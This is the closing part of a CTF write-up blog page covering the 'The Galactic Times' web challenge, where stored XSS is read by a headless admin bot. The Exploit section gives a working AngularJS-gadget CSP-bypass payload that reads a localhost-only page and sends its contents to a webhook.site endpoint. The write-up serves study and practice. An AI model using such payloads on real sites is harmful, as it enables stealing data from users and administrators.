+<h3 id="bot-js"><a href="#bot-js" class="headerlink" title="bot.js"></a><code>bot.js</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const puppeteer &#x3D; require(&#39;puppeteer&#39;);</span><br><span class="line"></span><br><span class="line">const browser_options &#x3D; &#123;</span><br><span class="line">    headless: true,</span><br><span class="line">    args: [</span><br><span class="line">        &#39;--no-sandbox&#39;,</span><br><span class="line">        &#39;--disable-background-networking&#39;,</span><br><span class="line">        &#39;--disable-default-apps&#39;,</span><br><span class="line">        &#39;--disable-extensions&#39;,</span><br><span class="line">        &#39;--disable-gpu&#39;,</span><br><span class="line">        &#39;--disable-sync&#39;,</span><br><span class="line">        &#39;--disable-translate&#39;,</span><br><span class="line">        &#39;--hide-scrollbars&#39;,</span><br><span class="line">        &#39;--metrics-recording-only&#39;,</span><br><span class="line">        &#39;--mute-audio&#39;,</span><br><span class="line">        &#39;--no-first-run&#39;,</span><br><span class="line">        &#39;--safebrowsing-disable-auto-update&#39;</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">async function purgeData(db)&#123;</span><br><span class="line">    const browser &#x3D; await puppeteer.launch(browser_options);</span><br><span class="line">    const page &#x3D; await browser.newPage();</span><br><span class="line"></span><br><span class="line">    await page.goto(&#39;http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;list&#39;, &#123;</span><br><span class="line">        waitUntil: &#39;networkidle2&#39;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    await browser.close();</span><br><span class="line">    await db.migrate();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123; purgeData &#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="views-alient-html"><a href="#views-alient-html" class="headerlink" title="views/alient.html"></a><code>views/alient.html</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[REDACTED]</span><br><span class="line">&lt;aside&gt;    </span><br><span class="line">    &lt;div&gt;                                                                                             </span><br><span class="line">        &lt;div class&#x3D;&quot;issue&quot;&gt;⟟⌇⌇⎍⟒ #256&lt;&#x2F;div&gt;                                                            </span><br><span class="line">        &lt;div class&#x3D;&quot;date&quot;&gt;⎎⍀⟟⎅⏃⊬, 29 ⋔⏃⍀☊⊑, 2069&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;edition&quot;&gt;CHTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;                    </span><br><span class="line">&lt;&#x2F;aside&gt;</span><br><span class="line">[REDACTED]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>We have to perform a <code>GET /alien</code> to get the flag which is in the <code>html</code>. However we will get blocked because the request is not coming from <code>127.0.0.1</code>. We can perform <code>POST /api/submit</code> to give feedback. This feedback gets saved in the database. After that <code>purgeData()</code> is called and the bot visits <code>http://127.0.0.1:1337/list</code>. This endpoint list all feedback including our recently added feedback. We cannot perform the <code>GET /list</code> ourselves because we will get blocked again due to <code>127.0.0.1</code> restriction. The added feedback is not sanitized therefore we can inject <code>html</code> tags without problems.</p>
+<p>The idea here is to insert a feedback containing <code>XSS</code> <code>&lt;script&gt;</code> tags. The bot will open the <code>/list</code> and parse the page which contains our <code>XSS</code> payload which will execute. The <code>XSS</code> payload should perform a <code>GET /alien</code> (which is fine because the request is coming from localhost) and send the page <code>html</code> to our remote listening endpoint.</p>
+<p>There is a problem. The server enforces <code>CSP</code>. Example.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;;script-src &#39;self&#39; &#39;unsafe-eval&#39; https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;;style-src &#39;self&#39; &#39;unsafe-inline&#39; https:&#x2F;&#x2F;unpkg.com&#x2F;nes.css&#x2F; https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;;font-src &#39;self&#39; https:&#x2F;&#x2F;fonts.gstatic.com&#x2F;;img-src &#39;self&#39; data:;child-src &#39;none&#39;;object-src &#39;none&#39;</span><br></pre></td></tr></table></figure>
+
+<p>For better understanding we can use <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a>.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://s-3ntinel.github.io/ctfs/cyberapocalypse_ctf2021/web/the_galactic_times/csp.PNG" alt="csp"></p>
+<p>There is unsafe-eval for <code>https://cdnjs.cloudflare.com</code>. <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-unsafe-eval">HackTricks</a> has a payload specifically for <code>cloudflare</code>, yay 🥳. The payload uses an <code>angular</code> scripts which is hosted on <code>cloudflare</code> with which we can perform <code>XHR</code> requests. With this we can perform a request (to <code>/alien</code>) and get the page content. Then we will send the page content to our remote endpoint.</p>
+<p>On more problem is, that the <code>/alien</code> page contains weird characters and (probably) the method in the payload will crash when reading those characters. So we will only “grep” a string from the page cointaing <code>CHTB&#123;.*&#125;</code> using js method <code>match()</code>.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Be sure to substitute the <code>location</code> with your own remote endpoint. We use <a target="_blank" rel="noopener" href="https://webhook.site/">webhook.site</a>.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.4.6&#x2F;angular.js&quot;&gt;&lt;&#x2F;script&gt;&lt;div ng-app&gt; &#123;&#123;&#39;a&#39;.constructor.prototype.charAt&#x3D;[].join;$eval(&#39;x&#x3D;1&#125; &#125; &#125;;var z&#x3D;new XMLHttpRequest();z.onreadystatechange&#x3D;function()&#123;if (z.responseText) location&#x3D;&quot;https:&#x2F;&#x2F;webhook.site&#x2F;4b9d1f8b-6d9a-4973-9a27-b81b2eebbaae?a&#x3D;&quot;+btoa(z.responseText.match(&#x2F;CHTB&#123;.*&#125;&#x2F;)[0])&#125;;z.open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;alien&quot;,false);z.send();&#x2F;&#x2F;&#39;);&#125;&#125; &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Sending payload…<br><img src= "/img/loading.gif" data-lazy-src="https://s-3ntinel.github.io/ctfs/cyberapocalypse_ctf2021/web/the_galactic_times/feedback.PNG" alt="feedback"></p>
+<p>We get a hit! 🙂<br><img src= "/img/loading.gif" data-lazy-src="https://s-3ntinel.github.io/ctfs/cyberapocalypse_ctf2021/web/the_galactic_times/hook.PNG" alt="hook"></p>
+<p>Parameter <code>a</code> contains <code>base64</code> encoded flag.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo -n &#39;Q0hUQnt0aDNfd2gxdDNsMXN0M2RfQ05EX3N0cjFrM3NfYjRja30&#x3D;&#39; | base64 -d</span><br><span class="line">CHTB&#123;th3_wh1t3l1st3d_CND_str1k3s_b4ck&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结一下把"><a href="#总结一下把" class="headerlink" title="总结一下把"></a>总结一下把</h1><p>其实 代码 没必要都看懂！ 关键的会就行了！ 主要是逻辑结构 要清除！！ </p>
+<p>慢慢来！ 渗透思路要广阔才行！ </p>
+<p>多打打比赛，看看题解！ </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/04/24/ctftime-1/">http://upload.love/2021/04/24/ctftime-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/xss%E7%9B%97%E5%8F%96cookie/">xss盗取cookie</a><a class="post-meta__tags" href="/tags/sqllite%E6%B3%A8%E5%85%A5-orderby%E6%B3%A8%E5%85%A5/">sqllite注入 orderby注入</a><a class="post-meta__tags" href="/tags/nosql%E6%B3%A8%E5%85%A5/">nosql注入</a><a class="post-meta__tags" href="/tags/AST-%E6%B3%A8%E5%85%A5/">AST 注入</a><a class="post-meta__tags" href="/tags/LFI-RCE-session/">LFI+RCE+session</a></div><div class="post_share"><div class="social-share" data-image="/image/ctftime.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/28/web%E7%9F%A5%E8%AF%86%E7%82%B9/"><img class="prev-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">web知识点</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/24/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97WEBSHELL/"><img class="next-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">无字母数字WEBSHELL</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Usual-or-Unusual"><span class="toc-number">1.</span> <span class="toc-text">Usual or Unusual</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PwnQL-1"><span class="toc-number">2.</span> <span class="toc-text">PwnQL #1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PwnQL-2"><span class="toc-number">3.</span> <span class="toc-text">PwnQL #2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hackbox-wp"><span class="toc-number">4.</span> <span class="toc-text">hackbox wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WildGooseHunt"><span class="toc-number">5.</span> <span class="toc-text">WildGooseHunt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nosql-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">nosql 注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Emoji-Voting"><span class="toc-number">6.</span> <span class="toc-text">Emoji Voting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqllite%E6%B3%A8%E5%85%A5-orderby%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">sqllite注入 orderby注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bug-Report"><span class="toc-number">7.</span> <span class="toc-text">Bug Report</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E7%9B%97%E5%8F%96cookie"><span class="toc-number">7.1.</span> <span class="toc-text">xss盗取cookie</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IFI-RCE"><span class="toc-number">8.</span> <span class="toc-text">IFI+RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E8%87%AA%E5%8A%A8%E8%AF%9D%E8%84%9A%E6%9C%AC"><span class="toc-number">8.1.</span> <span class="toc-text">session自动话脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BlitzProp"><span class="toc-number">9.</span> <span class="toc-text">BlitzProp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AST%E6%B3%A8%E5%85%A5-%E5%95%A5%E5%95%8A%EF%BC%81"><span class="toc-number">9.1.</span> <span class="toc-text">AST注入   啥啊！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CaaS-Solution"><span class="toc-number">10.</span> <span class="toc-text">CaaS Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E9%80%9A%E8%BF%87file-%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E5%92%8Chttp-%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">10.1.</span> <span class="toc-text">浏览器通过file:&#x2F;&#x2F;访问文件和http:&#x2F;&#x2F;访问文件的区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#junior-jwt"><span class="toc-number">11.</span> <span class="toc-text">junior-jwt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt%E7%BB%95%E8%BF%87-baby-web-jwt"><span class="toc-number">11.1.</span> <span class="toc-text">jwt绕过 baby web jwt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">11.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI"><span class="toc-number">12.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-python"><span class="toc-number">12.1.</span> <span class="toc-text">web python</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Black-Market"><span class="toc-number">13.</span> <span class="toc-text">Black Market</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nodejs-ssti"><span class="toc-number">13.1.</span> <span class="toc-text">nodejs ssti</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Galactic-Times"><span class="toc-number">14.</span> <span class="toc-text">The Galactic Times</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9Axss-csp%E7%BB%95%E8%BF%87"><span class="toc-number">14.1.</span> <span class="toc-text">知识点：xss+csp绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">14.2.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Files"><span class="toc-number">14.3.</span> <span class="toc-text">Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Looking-around"><span class="toc-number">14.4.</span> <span class="toc-text">Looking around</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">14.5.</span> <span class="toc-text">Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#routes-index-js"><span class="toc-number">14.5.1.</span> <span class="toc-text">routes&#x2F;index.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#database-js"><span class="toc-number">14.5.2.</span> <span class="toc-text">database.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bot-js"><span class="toc-number">14.5.3.</span> <span class="toc-text">bot.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#views-alient-html"><span class="toc-number">14.5.4.</span> <span class="toc-text">views&#x2F;alient.html</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Methodology"><span class="toc-number">14.6.</span> <span class="toc-text">Methodology</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">14.7.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%8A%8A"><span class="toc-number">15.</span> <span class="toc-text">总结一下把</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpgs)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/04/24/ctftime-1/'
+    this.page.identifier = '2021/04/24/ctftime-1/'
+    this.page.title = 'ctftime'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
